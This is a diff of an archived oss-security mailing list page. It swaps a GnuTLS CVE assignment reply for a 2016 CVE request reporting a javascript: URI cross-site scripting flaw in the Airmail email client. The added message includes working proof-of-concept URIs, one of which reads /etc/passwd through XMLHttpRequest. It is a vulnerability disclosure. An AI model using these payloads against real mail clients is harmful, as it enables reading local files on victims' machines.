@@ -1,48 +1,64 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/7
-Message-Id: <20160918144138.A17646C571B@smtpvmsrv1.mitre.org>
-Date: Sun, 18 Sep 2016 10:41:38 -0400 (EDT)
-From: cve-assign@...re.org
-To: carnil@...ian.org
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request: GnuTLS: OCSP validation issue (GNUTLS-SA-2016-3)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/08/22
+Message-ID: <CAPGxrc-RbECjbYfpBZPHusDYo_B5BDrKKzRKQ1zwbaNN21wLqA@mail.gmail.com>
+Date: Fri, 9 Sep 2016 05:28:26 +0800
+From: redrain root <rootredrain@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request - Airmail URLScheme render and file:// xss vulnerability
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Airmail is a popular email client on iOS and OS X.
+I found a vulnerability in airmail of the latest version which could cause
+a file:// xss and arbitrary file read.
 
-> can falsely report a
-> certificate as valid under certain circumstances
+Author: redrain, yu.hong@...itin.com
+Date: 2016-08-15
+Version: 3.0.2 and earlier
+Platform: OS X and iOS
+Site: http://airmailapp.com/
+Vendor: http://airmailapp.com/
+Vendor Notified: 2016-08-15
 
->> if the serial from the revoked certificate is a
->> prefix of the other one, and the additional bytes happen to be equal
->> on the system doing the verification.
- 
-> https://lists.gnupg.org/pipermail/gnutls-devel/2016-September/008146.html
-> https://gitlab.com/gnutls/gnutls/commit/964632f37dfdfb914ebc5e49db4fa29af35b1de9
-> https://bugzilla.redhat.com/show_bug.cgi?id=1374266
+Vulnerability:
+There is a file:// xss in airmail version 3.0.2 and earlier.
+The app can deal the URLscheme render with link detection, any user can
+edit the email content in reply with the evil code with the TL;DR.
 
-Use CVE-2016-7444.
+Airmail implements its user interface using an embedded version of WebKit,
+furthermore Airmail on OS X will render any URI as a clickable HTML <a
+href= link. An attacker can create a simple JavaScript URI (e.g.,
+javascript:) which when clicked grants the attacker initial JavaScript
+execution (XSS) in the context of the application DOM.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQIcBAEBCAAGBQJX3qaBAAoJEHb/MwWLVhi2ZIQQALqBsgvjmj3aKEwKaFKSvNcM
-vOm5UKhOpdwYX7syoPi9J/IfGcvs2Z8K1GPnOxvyyuFBcBzbypgW+UnEvv8kT7ze
-5ckPgFSjfaco1cYcBhKq5hlQoTLayhH3YP8XDzWlfE3KijEJAQuA6+wcHL2ddg3d
-29nAuKgIkd27SZMEDDcv+x8b3Ibnds/LWUWFleAEPBBiyTrSgeLiWmgLToHSiOND
-wyfmiNg9SouaBm3icAnd95AHYQmMztrd5xEvuAWK3ZsMFgJtrPjK1kTk13madyfN
-TgwwQ2PM99EmRgaXHqvrXeRcohRQtV2ptgMqQS9a31fk7uJb8HITNgESoM4z2FRF
-dLpLzDAMm9X1IKXRDDHqOPobFgwe/ZyG3MEl8994N1Y3N2QYrXm84SmiWTYtDlcD
-HX2NFievDARKQBzHvJhQwDw98rdFb9P7CLvz4dolVix07xZzy505exktxpAH0yTs
-2LXkpB1FQb99ZJzPPZ967S1bY0fpANQzCFLBQlZ8B5g2bmUwo52c+C+JsHay/+3i
-dnFPSxTJVXRStPHs1II7NufIGjBlitfIHIRlpTtzCsFTy7ppgI5PEfpA/tnCFkXR
-bhrtIOGqqGyj2ySa4nmYhA95MRLO7XoNIXYT5byRpXI6I6pIEIRkNxeYIChSydEY
-m1uV5gCz/FIWXRCl6Dzi
-=1u4M
------END PGP SIGNATURE-----
+PoC:
+javascript://www.baidu.com/research?%0Aprompt(1)
+
+​
+
+Arbitrary file read:
+
+javascript://www.baidu.com/research?%0Afunction%20reqListene
+r%20()%20%7B%0A%20%20prompt(this.responseText)%3B%0A%7D%0Ava
+r%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0AoReq.addEventLi
+stener(%22load%22%2C%20reqListener)%3B%0AoReq.open(
+%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B
+
+
+​
+Resolution:
+
+Airmail call the webkit to translate the html, javascript: and
+javascript://%0a%0d  are supported because of link detection in webkit
+info.plist.
+
+So we can just broke the URI, for example, add a “<blank>” behind the
+“javascript” OS X and iOS will not render this URI as a clickable HTML <a
+href=xxx>
+
+
+Could you assign CVE id for this?
+
+Regards,
+redrain
+
